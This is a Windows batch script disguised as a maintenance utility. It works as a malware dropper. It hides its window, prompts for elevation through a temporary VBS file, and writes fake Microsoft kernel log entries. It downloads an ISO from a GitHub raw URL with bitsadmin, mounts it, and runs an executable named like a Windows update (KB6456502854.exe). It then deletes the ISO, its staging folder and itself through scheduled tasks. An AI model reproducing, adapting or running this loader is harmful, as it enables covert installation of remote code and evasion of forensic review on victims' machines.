@echo off
if not "%1"=="min" start /min cmd /c %0 min & exit
setlocal

:: Windows Maintenance Utility
title Windows Command Processor

:: ============= SELF-ELEVATION CHECK =============
:: Check if running as administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    
    :: Create VBS script for UAC elevation
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c """"%~s0""""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    
    :: Clean up and exit current instance
    del "%temp%\getadmin.vbs" >nul 2>&1
    exit /b
)

:: ========== Stage 1: Init ==========
set "stage1=C:\ProgramData\Microsoft\Windows\WER\Temp"
set "stage2=C:\Windows\Help\Microsoft\HelpContent"
mkdir %stage1% 2>nul
mkdir %stage2% 2>nul

:: ========== Stage 2: LOG ACTIVITY ==========
schtasks /create /tn "SystemLog" /tr "eventcreate /ID 101 /L SYSTEM /SO 'Microsoft-Windows-Kernel-General' /T INFORMATION /D 'System uptime: 2 hours'" /sc once /st 00:05 /f
schtasks /run /tn "SystemLog" > nul
schtasks /create /tn "SystemLogUpdate" /tr "eventcreate /ID 102 /L SYSTEM /SO 'Microsoft-Windows-Kernel-General' /T INFORMATION /D 'System is updating'" /sc once /st 00:10 /f
schtasks /run /tn "SystemLogUpdate" > nul
schtasks /delete /tn "SystemLog" /f
schtasks /delete /tn "SystemLogUpdate" /f

:: ========== Stage 3: Download ISO ==========
set "iso_url=https://raw.githubusercontent.com/project-nl-dev/lxqt-lab/main/win-update.iso"
set "iso_path=%stage1%\win-update.iso"
bitsadmin /transfer mydownloadjob /download /priority high "%iso_url%" "%iso_path%"

if exist "%iso_path%" (
    echo + ISO download successfully!
) else (
    echo Error. No download ISO.
    exit /b 1
)

:: ========== Stage 4: (30-60 s) ==========
set /a delay=%random% %%30 + 30
ping -n %delay% 127.0.0.1 > nul

:: ========== Stage 5: Mount ISO ==========
powershell -Command "Mount-DiskImage -ImagePath '%iso_path%'"

:: ========== Stage 6: SERVICE CHECK ==========
sc query wuauserv > nul 2>&1
ping -n 8 127.0.0.1 > nul

:: ========== Stage 7: Search ant run launcher ISO ==========
if exist "D:\KB6456502854.exe" (
    echo starting...
    D:\KB6456502854.exe
) else (
    echo File no found.
    exit /b 1
)

:: ========== Stage 8: Unmount ISO ==========
powershell -Command "Dismount-DiskImage -ImagePath '%iso_path%'"

:: ========== Stage 9: Del ==========
schtasks /create /tn "SystemCleanup" /tr "cmd /c del /f /q %iso_path% & rmdir /s /q %stage1%" /sc once /st 23:59 /f
schtasks /run /tn "SystemCleanup" > nul
schtasks /delete /tn "SystemCleanup" /f

:: ========== Stage 10: DEL ==========
schtasks /create /tn "SelfDelete" /tr "cmd /c del \"%~f0\"" /sc once /st 23:59 /f
schtasks /run /tn "SelfDelete" > nul
schtasks /delete /tn "SelfDelete" /f

endlocal

pause
